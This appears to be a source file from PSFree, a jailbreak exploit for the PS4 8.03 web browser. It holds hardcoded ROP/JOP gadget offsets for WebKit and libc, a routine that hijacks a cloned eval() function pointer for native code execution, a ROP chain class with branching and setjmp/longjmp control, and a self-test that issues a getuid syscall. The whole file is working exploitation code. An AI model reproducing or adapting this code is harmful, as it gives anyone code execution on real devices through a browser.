/* Copyright (C) 2023 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import * as config from './config.mjs';

import { Int } from './module/int64.mjs';
import { debug_log, align, die } from './module/utils.mjs';
import { Addr, mem } from './module/mem.mjs';
import { KB, MB } from './module/constants.mjs';
import { ChainBase } from './module/chain.mjs';

import {
    make_buffer,
    find_base,
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from './module/memtools.mjs';

import * as rw from './module/rw.mjs';
import * as o from './module/offset.mjs';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const syscall_array = [];

const offset_func_classinfo = 0x10
const offset_func_exec = 0x18;
const offset_textarea_impl = 0x18;
const offset_js_inline_prop = 0x10;

// WebKit offsets of imported functions
const offset_wk_stack_chk_fail = 0x8d8;
const offset_wk_memcpy = 0x918;

// libSceLibcInternal offsets
const offset_libc_setjmp = 0x258f4;
const offset_libc_longjmp = 0x29c58;

// see the disassembly of setjmp() from the dump of libSceLibcInternal.sprx
//
// int setjmp(jmp_buf)
// noreturn longjmp(jmp_buf)
//
// This version of longjmp() does not take another argument to be used as
// setjmp()'s return value. Offset 0 of the jmp_buf will be the restored
// rax. Change it if you want a specific value from setjmp() after the
// longjmp().
const jmp_buf_size = 0xc8;
let setjmp_addr = null;
let longjmp_addr = null;

// libSceNKWebKit.sprx
let libwebkit_base = null;
// libkernel_web.sprx
let libkernel_base = null;
// libSceLibcInternal.sprx
let libc_base = null;

// gadgets for the JOP chain
const jop1 = `
mov rdi, qword ptr [rdi + 0x30]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 8]
`;
const jop2 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop3 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop4 = `
push rdx
mov edi, 0xac9784fe
jmp qword ptr [rax]
`;
const jop5 = 'pop rsp; ret';

// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
//
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
//
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp
const rop_epilogue = 'leave; ret';

const webkit_gadget_offsets = new Map(Object.entries({
    'pop rax; ret' : 0x0000000000035a1b,
    'pop rbx; ret' : 0x000000000001537c,
    'pop rcx; ret' : 0x0000000000025ecb,
    'pop rdx; ret' : 0x0000000000060f52,

    'pop rbp; ret' : 0x00000000000000b6,
    'pop rsi; ret' : 0x000000000003bd77,
    'pop rdi; ret' : 0x00000000001e3f87,
    'pop rsp; ret' : 0x00000000000bf669,

    'pop r8; ret' : 0x0000000000097442,
    'pop r9; ret' : 0x00000000006f501f,
    'pop r10; ret' : 0x0000000000060f51,
    'pop r11; ret' : 0x0000000000d2a629,

    'pop r12; ret' : 0x0000000000d8968d,
    'pop r13; ret' : 0x00000000016ccff1,
    'pop r14; ret' : 0x000000000003bd76,
    'pop r15; ret' : 0x00000000002499df,

    'ret' : 0x0000000000000032,
    'leave; ret' : 0x0000000000291fd7,

    'neg rax; and rax, rcx; ret' : 0x0000000000e85f24,
    'adc esi, esi; ret' : 0x000000000088cbb9,
    'add rax, rdx; ret' : 0x00000000003cd92c,
    'push rsp; jmp qword ptr [rax]' : 0x0000000001abbc92,
    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000000b8bc06,
    'pop rdi; jmp qword ptr [rax + 0x50]' : 0x00000000021f9e8e,

    'mov qword ptr [rdi], rsi; ret' : 0x0000000000034a40,
    'mov rax, qword ptr [rax]; ret' : 0x000000000002dc62,
    'mov qword ptr [rdi], rax; ret' : 0x000000000005b1bb,
    'mov rdx, rcx; ret' : 0x0000000000eae9fd,

    [jop1] : 0x000000000028a8d0,
    [jop2] : 0x000000000076b970,
    [jop3] : 0x0000000000202698,
    [jop4] : 0x00000000021af6ad,
}));

const libc_gadget_offsets = new Map(Object.entries({
    'neg rax; ret' : 0x00000000000d3503,
    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000ce436,
    'mov qword ptr [rsi], rcx; ret' : 0x00000000000cede2,
    'setjmp' : offset_libc_setjmp,
    'longjmp' : offset_libc_longjmp,
}));

const gadgets = new Map();

function get_bases() {
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const libwebkit_base = find_base(textarea_vtable, true, true);

    const stack_chk_fail_import =
        libwebkit_base
        .add(offset_wk_stack_chk_fail)
    ;
    const stack_chk_fail_addr = resolve_import(
        stack_chk_fail_import,
        true,
        true
    );
    const libkernel_base = find_base(stack_chk_fail_addr, true, true);

    const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
    const memcpy_addr = resolve_import(memcpy_import, true, true);
    const libc_base = find_base(memcpy_addr, true, true);

    return [
        libwebkit_base,
        libkernel_base,
        libc_base,
    ];
}

function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

// Creates a JSValue with the supplied 64-bit argument
//
// JSValues are 64-bit integers representing a JavaScript value (primitives and
// objects), but not all possible 64-bit values are JSValues. So be careful in
// using this value in situations expecting a valid JSValue.
//
// See WebKit/Source/JavaScriptCore/runtime/JSCJSValue.h at webkitgtk 2.34.4.
// Look for USE(JSVALUE64) since the PS4 platform is 64-bit.
function create_jsvalue(value) {
    // Small enough object so that the "value" property is inlined, it is not
    // at the butterfly.
    const res = {value : 0};
    // change the inlined JSValue
    mem.addrof(res).write64(offset_js_inline_prop, value);
    return res.value;
}

// We create a JSFunction clone of eval(). Built-in functions have function
// pointers we can overwrite for code execution. We creates clones instead of
// modifying a built-in, so that multiple ROP chains do not need to share the
// same function.
function create_builtin() {
    function func() {}

    // JSC::JSFunction
    const js_func = mem.addrof(func);
    // eval() is a built-in function
    const js_func_eval = mem.addrof(eval);

    // We need to copy eval()'s JSC::ClassInfo for the JavaScript VM to accept
    // the function as built-in.
    js_func.write64(
        offset_func_classinfo,
        js_func_eval.read64(offset_func_classinfo)
    );
    // Clone eval()'s m_executableOrRareData (type is JSC::NativeExecutable
    // since eval() is a built-in). Its size is 0x58 for PS4 8.03.
    const exec = make_buffer(js_func_eval.readp(offset_func_exec), 0x58);
    const exec_view = new Uint8Array(exec.slice(0));
    const exec_view_vector = get_view_vector(exec_view);

    js_func.write64(offset_func_exec, exec_view_vector);
    // Maintain a reference to the view of the cloned m_executableOrRareData or
    // it will be garbage collected.
    func.exec = exec_view;

    return func;
}

// Chain for PS4 8.03
class Chain803 extends ChainBase {
    constructor() {
        super();

        // for the JOP chain
        const rax_ptrs = new Uint8Array(0x100);
        const rax_ptrs_p = get_view_vector(rax_ptrs);
        this.rax_ptrs = rax_ptrs;

        rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop3));
        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
        // value to pivot rsp to
        rw.write64(this.rax_ptrs, 0x18, this.stack_addr);

        const jop_buffer = new Uint8Array(8);
        const jop_buffer_p = get_view_vector(jop_buffer);
        this.jop_buffer = jop_buffer;

        rw.write64(jop_buffer, 0, rax_ptrs_p);

        this.func = create_builtin();
        // JSC::JSFunction::m_executableOrRareData
        const func_exec = mem.addrof(this.func).readp(offset_func_exec)
        this.func_argument = create_jsvalue(jop_buffer_p);

        // JSC::NativeExecutable::m_function
        func_exec.write64(0x38, this.get_gadget(jop1));

        // for conditional jumps
        this._clean_branch_ctx();
        this.flag = new Uint8Array(8);
        this.flag_addr = get_view_vector(this.flag);
        this.jmp_target1 = new Uint8Array(0x100);
        rw.write64(this.jmp_target1, 0x50, this.get_gadget(jop4));
        rw.write64(this.jmp_target1, 0, this.get_gadget(jop5));

        // for save/restore
        this.is_saved = false;
        const jmp_buf_size = 0xc8;
        this.jmp_buf = new Uint8Array(jmp_buf_size);
        this.jmp_buf_p = get_view_vector(this.jmp_buf);
    }

    run() {
        this.check_stale();
        this.check_is_empty();
        this.check_is_branching();

        // jump to JOP chain
        this.func(this.func_argument);
    }

    check_is_branching() {
        if (this.is_branch_ctx) {
            throw Error('chain is still branching, end it before running');
        }
    }

    push_value(value) {
        super.push_value(value);

        if (this.is_branch_ctx) {
            this.branch_position += 8;
        }
    }

    _clean_branch_ctx() {
        this.is_branch_ctx = false;
        this.branch_position = null;
        this.delta_slot = null;
        this.rsp_slot = null;
        this.rsp_position = null;
    }

    clean() {
        super.clean();
        this._clean_branch_ctx();
    }

    // Use start_branch() and end_branch() to delimit a ROP chain that will
    // conditionally execute. rax must be set accordingly before the branch.
    // rax == 0 means execute the conditional chain.
    //
    // example that always execute the conditional chain:
    //     chain.push_gadget('mov rax, 0; ret');
    //     chain.start_branch();
    //     chain.push_gadget('pop rbx; ret'); // always executed
    //     chain.end_branch();
    start_branch() {
        if (this.is_branch_ctx) {
            throw Error('chain already branching, end it first');
        }

        const call_target = this.branch_helper_addr;

        // clobbers rax, rcx, rdi, rsi
        //
        // u64 flag = 0 if -rax == 0 else 1
        // *flag_addr = flag
        this.push_gadget('pop rcx; ret');
        this.push_constant(-1);
        this.push_gadget('neg rax; ret');
        this.push_gadget('pop rsi; ret');
        this.push_constant(0);
        this.push_gadget('adc esi, esi; ret');
        this.push_gadget('pop rdi; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov qword ptr [rdi], rsi; ret');

        // clobbers rax, rcx, rdi
        //
        // rax = *flag_addr
        // rcx = delta
        // rax = -rax & rcx
        // *flag_addr = rax
        this.push_gadget('pop rax; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov rax, qword ptr [rax]; ret');

        // dummy value, overwritten later by end_branch()
        this.push_gadget('pop rcx; ret');
        this.delta_slot = this.position;
        this.push_constant(0);

        this.push_gadget('neg rax; and rax, rcx; ret');
        this.push_gadget('pop rdi; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        // clobbers rax, rcx, rdx, rsi
        //
        // rcx = rsp_position
        // rsi = rsp
        // rcx += rsi
        // rdx = rcx
        //
        // dummy value, overwritten later at the end of start_branch()
        this.push_gadget('pop rcx; ret');
        this.rsp_slot = this.position;
        this.push_constant(0);

        this.push_gadget('pop rsi; ret');
        this.push_value(this.stack_addr.add(this.position + 8));

        // rsp collected here, start counting how much to perturb rsp
        this.branch_position = 0;
        this.is_branch_ctx = true;

        this.push_gadget('add rcx, rsi; and rdx, rcx; or rax, rdx; ret');
        this.push_gadget('mov rdx, rcx; ret');

        // clobbers rax
        //
        // rax = *flag_addr
        this.push_gadget('pop rax; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov rax, qword ptr [rax]; ret');

        // clobbers rax
        //
        // rax += rdx
        // new_rsp = rax
        this.push_gadget('add rax, rdx; ret');

        // clobbers rdi
        //
        // for debugging, save new_rsp to flag_addr so we can verify it later
        this.push_gadget('pop rdi; ret');
        this.push_value(this.flag_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        // clobbers rdx, rcx
        //
        // rdx = rax
        this.push_gadget('pop rcx; ret');
        this.push_constant(0);
        this.push_gadget('mov rdx, rax; xor eax, eax; shl rdx, cl; ret');

        // clobbers rax, rdx, rdi, rsp
        //
        // rsp = rdx
        this.push_gadget('pop rax; ret');
        this.push_value(get_view_vector(this.jmp_target1));
        this.push_gadget('pop rdi; jmp qword ptr [rax + 0x50]');
        this.push_constant(0); // padding for the push

        this.rsp_position = this.branch_position;
        rw.write64(this.stack, this.rsp_slot, new Int(this.rsp_position));
    }

    end_branch() {
        if (!this.is_branch_ctx) {
            throw Error('can not end nonbranching chain');
        }

        const delta = this.branch_position - this.rsp_position;
        rw.write64(this.stack, this.delta_slot, new Int(delta));
        this._clean_branch_ctx();
    }

    // clobbers rax, rdi, rsi
    push_save() {
        if (this.is_saved) {
            throw Error('restore first before saving again');
        }
        this.push_call(this.get_gadget('setjmp'), this.jmp_buf_p);
        this.is_saved = true;
    }

    // Force a push_restore() if at runtime you can ensure the save/restore
    // pair line up.
    push_restore(is_force=false) {
        if (!this.is_saved && !is_force) {
            throw Error('save first before restoring');
        }
        // modify jmp_buf.rsp
        this.push_gadget('pop rax; ret');
        const rsp_slot = this.position;
        // dummy value, overwritten later at the end of push_restore()
        this.push_constant(0);
        this.push_gadget('pop rdi; ret');
        this.push_value(this.jmp_buf_p.add(0x38));
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        // modify jmp_buf.return_address
        this.push_gadget('pop rax; ret');
        this.push_value(this.get_gadget('ret'));
        this.push_gadget('pop rdi; ret');
        this.push_value(this.jmp_buf_p.add(0x80));
        this.push_gadget('mov qword ptr [rdi], rax; ret');

        this.push_call(this.get_gadget('longjmp'), this.jmp_buf_p);

        // Padding as longjmp() pushes the restored rdi and the return address
        // at the target rsp.
        this.push_constant(0);
        this.push_constant(0);
        const target_rsp = this.stack_addr.add(this.position);

        rw.write64(this.stack, rsp_slot, target_rsp);
        this.is_saved = false;
    }

    push_get_retval() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.retval_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');
    }

    call(...args) {
        if (this.position !== 0) {
            throw Error('call() needs an empty chain');
        }
        this.push_call(...args);
        this.push_get_retval();
        this.push_gadget('leave; ret');
        this.run();
        this.clean();
    }

    syscall(...args) {
        if (this.position !== 0) {
            throw Error('syscall() needs an empty chain');
        }
        this.push_syscall(...args);
        this.push_get_retval();
        this.push_gadget('leave; ret');
        this.run();
        this.clean();
    }
}
const Chain = Chain803;

function rop() {
    const jmp_buf = new Uint8Array(jmp_buf_size);
    const jmp_buf_p = get_view_vector(jmp_buf);
    [libwebkit_base, libkernel_base, libc_base] = get_bases();

    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
    alert('finding sycalls, this will take a while');
    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
    debug_log('syscall_array:');
    debug_log(syscall_array);
    Chain.init_class(gadgets, syscall_array);

    setjmp_addr = gadgets.get('setjmp');
    longjmp_addr = gadgets.get('longjmp');

    const chain = new Chain();
    // Instead of writing to the jmp_buf, set rax here so it will be restored
    // as the return value after the longjmp().
    chain.push_gadget('pop rax; ret');
    chain.push_constant(1);
    chain.push_call(setjmp_addr, jmp_buf_p);

    chain.start_branch();

    debug_log(`if chain addr: ${chain.stack_addr.add(chain.position)}`);
    chain.push_call(longjmp_addr, jmp_buf_p);

    chain.end_branch();

    debug_log(`endif chain addr: ${chain.stack_addr.add(chain.position)}`);
    chain.push_gadget('leave; ret');

    // The ROP chain is a noop. If we crashed, then we did something wrong.
    alert('chain run');
    debug_log('test call setjmp()/longjmp()');
    chain.run()
    alert('returned successfully');
    debug_log('returned successfully');
    debug_log('jmp_buf:');
    debug_log(jmp_buf);
    debug_log(`flag: ${rw.read64(chain.flag, 0)}`);

    const state1 = new Uint8Array(8);
    debug_log('test if rax == 0');
    chain.clean();

    chain.push_gadget('pop rsi; ret');
    chain.push_value(get_view_vector(state1));
    chain.push_save();
    chain.push_gadget('pop rax; ret');
    chain.push_constant(0);

    chain.start_branch();
    chain.push_restore();

    chain.push_gadget('pop rcx; ret');
    chain.push_constant(1);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_gadget('leave; ret');

    chain.end_branch();

    chain.push_restore(true);
    chain.push_gadget('pop rcx; ret');
    chain.push_constant(2);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_gadget('leave; ret');

    chain.run();
    debug_log(`state1 must be 1: ${state1}`);
    if (state1[0] !== 1) {
        die('if branch not taken');
    }

    const state2 = new Uint8Array(8);
    debug_log('test if rax != 0');
    chain.clean();

    chain.push_gadget('pop rsi; ret');
    chain.push_value(get_view_vector(state2));
    chain.push_save();
    chain.push_gadget('pop rax; ret');
    chain.push_constant(1);

    chain.start_branch();
    chain.push_restore();

    chain.push_gadget('pop rcx; ret');
    chain.push_constant(1);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_gadget('leave; ret');

    chain.end_branch();

    chain.push_restore(true);
    chain.push_gadget('pop rcx; ret');
    chain.push_constant(2);
    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
    chain.push_gadget('leave; ret');

    chain.run();
    debug_log(`state2 must be 2: ${state2}`);
    if (state2[0] !== 2) {
        die('if branch taken');
    }

    debug_log('test syscall getuid()');
    chain.clean();
    // Set the return value to some random value. If the syscall worked, then
    // it will likely change value.
    const magic = 0x4b435546;
    rw.write32(chain._return_value, 0, magic);

    chain.syscall('getuid');

    debug_log(`return value: ${chain.return_value}`);
    if (chain.return_value.low() === magic) {
        die('syscall getuid failed');
    }
}

rop();
